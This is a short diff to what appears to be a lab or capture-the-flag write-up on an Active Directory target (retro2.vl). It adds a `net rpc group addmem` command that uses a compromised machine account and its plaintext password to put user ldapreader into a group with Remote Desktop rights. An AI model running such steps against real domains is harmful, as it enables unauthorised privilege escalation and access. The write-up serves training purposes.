@@ -348,5 +348,12 @@ SMB         10.129.12.5     445    BLN01            [+] retro2.vl\ldapreader:ppY
 ```
 This user has been compromised and with this user account i should be able to use `admws01$` to add this user to the services group, the user will then inherit RDP rights since the services group is a member of remote desktop users
 
+```python
+net rpc group addmem "services" "ldapreader" -U "retro2.vl"/"admws01$"%'dmuhackers123!' -S "10.129.12.5"
+```
+This added the user `ldapreader` to the services group
 
+```python
+
+```
 
